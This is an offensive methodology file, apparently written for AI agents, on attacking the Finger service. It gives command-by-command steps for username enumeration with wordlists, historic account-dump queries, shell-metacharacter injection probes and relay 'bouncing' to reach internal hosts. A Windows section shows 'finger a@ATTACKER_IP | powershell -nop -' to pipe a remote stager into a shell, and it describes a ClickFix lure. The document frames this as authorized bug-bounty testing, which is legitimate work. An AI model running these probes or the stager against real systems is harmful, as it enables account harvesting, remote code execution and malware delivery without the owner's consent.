---
technology: "Finger"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
provenance: "corpus-grounded (1 writeup: Solaris fingerd + pentestmonkey finger-user-enum with seclists names — the corpus's only finger attack chain) + upstream-verified (RFC 1288 query grammar; classic fingerd CVEs 1999-0152 / 1999-0197 / 2001-1503; 0xffsec service handbook query forms consulted and rewritten). Thin unit, upstream-heavy by design. Companion overview: [[finger|Finger]]. Phase 5 additions: rewritten from HackTricks (hacktricks/src/network-services-pentesting/pentesting-finger.md), CC BY-NC 4.0, accessed 2026-11-13 — finger.nse verified in the nmap repo (categories default/discovery/safe), finger-user-enum -T/-r flags verified against the script source, finger.exe LOLBAS entry verified on lolbas-project.github.io, metasploit finger_users module verified in the metasploit repo; HT's 'fat-finger.nse' not carried (absent from nmap and no verifiable upstream found)."
---

# Finger bug bounty methodology

Target model: fingerd on 79/tcp, pre-auth query/response, no encryption, no rate limits.
The daemon family (Solaris in.fingerd, BSD-lineage in.fingerd, cfingerd) decides which
advanced probes apply; the enumeration core applies to all. Authorization assumed; all
steps are read-only probes by nature.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| User enumeration | any fingerd | yes | Valid account list for brute/phishing — Info/Low |
| Logged-in/active users (`finger @host`) | most fingerds | yes | Session presence, idle times — Info |
| All-accounts dump (`0@`, padded-string form) | old Solaris/Unix stacks (CVE-1999-0197 / CVE-2001-1503) | yes | Full account inventory — Low/Medium |
| Command execution via metacharacters | historic program-passthrough fingerds (CVE-1999-0152) | yes | RCE — Critical |
| Finger bouncing (`@a@b` forwarding) | forwarding-enabled fingerds (Solaris) | yes | Internal relay/pivot — Medium |

## Phase 0 — Confirm and fingerprint

```bash
nmap -p 79 -sV 198.51.100.10
# 79/tcp open  finger  (banner line often names the stack: "Sun Solaris fingerd")
# raw handshake — finger answers before any auth:
echo "root" | nc -n 198.51.100.10 79
#   → login, Real Name, directory, shell, last-login, mail status  = oracle confirmed
finger root@198.51.100.10     # same via client; -l for the long multi-line form
```

Calibrate the oracle before anything else: query a name certain to exist (`root`), a
random string, and an empty query (`finger @198.51.100.10` — lists logged-in users).
Record the reply-shape difference; that asymmetry is your enumeration signal.

## Phase 1 — User enumeration (the primary play)

Observed chain: against Solaris fingerd, run pentestmonkey's finger-user-enum
with a seclists username list; it walks names and reports which return records — the
chain recovered the target's real interactive users this way, then aimed SSH at them.

```bash
# pentestmonkey finger-user-enum (perl) + a name list
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 198.51.100.10
# equivalent DIY loop (same signal, no tool):
while read u; do echo "== $u"; finger "$u@198.51.100.10"; done < names.txt
```

Expected output per hit: login, full name, home dir, shell, last login, unread-mail
count, `.plan`/`.project` text. Everything beyond the username is bonus recon — real
names feed password guesses (FirstLast, flast), `.plan` files leak project and host
names. Severity of the enumeration itself: Low; report it as feeding material for the
phishing/brute findings that follow.

## Phase 2 — Special queries (historic dumps)

One cheap, non-destructive shot each on old Unix stacks — RFC-1288-era daemons
interpret these specially (classic CVEs 1999-0197, 2001-1503):

```bash
finger 0@198.51.100.10                       # some fingerds: account dump
finger "'a b c d e f g h'@198.51.100.10"      # padded-string form: all-accounts listing
finger -l user@198.51.100.10                  # long form: maximum detail per record
```

Also try dictionary words as queries (admin, guest, operator, project): some daemons
match partial strings and return every account containing them.

## Phase 3 — Metacharacter / command-injection probes

Historic BSD-lineage fingerds passed the query toward a program, so shell
metacharacters could execute (CVE-1999-0152 class). Modern stacks treat the query as
data; the probe is cheap either way:

```bash
finger "|/bin/id@198.51.100.10"
finger "root;/usr/bin/id@198.51.100.10"
finger "'`id`'@198.51.100.10"
```

Any reply that contains command *output* (uid/gid lines) instead of a user record or an
error is RCE — capture the transcript verbatim and stop; escalate through the program
chain only under explicit authorization. No output means the daemon sanitized or never
executed; record as not-vulnerable on this stack.

## Phase 4 — Finger bouncing (relay)

Forwarding fingerds (Solaris lineage) accept chained destinations, relaying the query
to an inner host as if originating from the fingerd itself:

```bash
finger @198.51.100.20@198.51.100.10     # ask 10 to query 20's logged-in users
finger root@198.51.100.20@198.51.100.10 # relayed user lookup
```

Value: enumerating hosts you cannot reach directly and sourcing queries from a trusted
internal origin. Map reachable inner fingerds this way; the relay is a Medium finding
on its own when it crosses trust zones.

## Phase 5 — Tooling and probe-form additions (upstream additions, 2026-11-13)

**nmap's finger NSE** (default/discovery/safe) automates the null query — it retrieves
the current user list in a `nmap -sV -sC -p 79` sweep with no extra flags.

**Batch and differential probe forms** when the daemon is not stock Solaris/BSD — the
raw-socket equivalents of what metasploit's `auxiliary/scanner/finger/finger_users`
tries automatically (empty, `0`, and `.` queries; multi-name requests when the daemon
accepts them; single-user fallback when not; results stored as a `finger.users` note
ready to feed SSH/VPN/spray workflows):

```
printf 'root admin oracle mysql ftp user test\r\n' | nc -n 198.51.100.10 79
printf 'root,admin,oracle,mysql\r\n' | nc -n 198.51.100.10 79   # comma form, older daemons
printf '\r\n' | nc -n 198.51.100.10 79                           # null query = logged-in users
```

**finger-user-enum flags beyond `-U`/`-t`** (verified against the script itself):
`-T <file>` walks a target list, and `-r <relay-host>` routes every query through an
intermediate fingerd — the scripted form of Phase 4's manual relay, enumerate an
unreachable inner host's accounts through a reachable outer one.

**Windows finger.exe as a delivery/ingress LOLBIN**: finger.exe is a signed Windows
binary that fetches arbitrary text from any finger server on TCP/79 and prints it —
so on a Windows box it doubles as attacker-controlled-channel transport (LOLBAS
documents it): `cmd /c finger a@ATTACKER_IP > payload.txt` stages text to disk, and
`finger a@ATTACKER_IP | powershell -nop -` pipes a plaintext stager straight into a
shell. Public intrusion reporting shows the same primitive used as a ClickFix lure —
the victim is enticed to run `finger <nonce>@<domain>` from the Run dialog. Relevant
when your engagement includes endpoint tradecraft, not just service enumeration.

**Shodan**: `port:79 USER` surfaces finger-exposed hosts.

## Reporting notes

Enumeration is usually Info/Low — its weight is what it unlocks; quote the reply-shape
calibration (root vs random) as evidence and the recovered account list as impact. A
metacharacter hit is Critical pre-auth RCE; include the exact query and output. The
bouncing relay is Medium with the inner-host evidence. Remediation framing: disable
fingerd; there is no hardened configuration worth defending on a 1991 protocol.

## Appendix — Tool map

- **nmap** (`-p 79 -sV`) — service confirmation — Phase 0.
- **finger / nc** — query client and raw socket forms — Phases 0-4.
- **finger-user-enum (pentestmonkey)** — list-walking enumeration — Phase 1.
- **seclists** (username wordlists) — Phase 1 input.
- Tools vault companions by name: nmap, netcat, seclists.

CVE index: 1999-0152 (fingerd program-passthrough command execution) · 1999-0197
(finger `0` account dump) · 2001-1503 (padded-string all-accounts listing) — all
ancient, all still present on unmodified Solaris-era estates; verify per target rather
than claiming by banner alone.
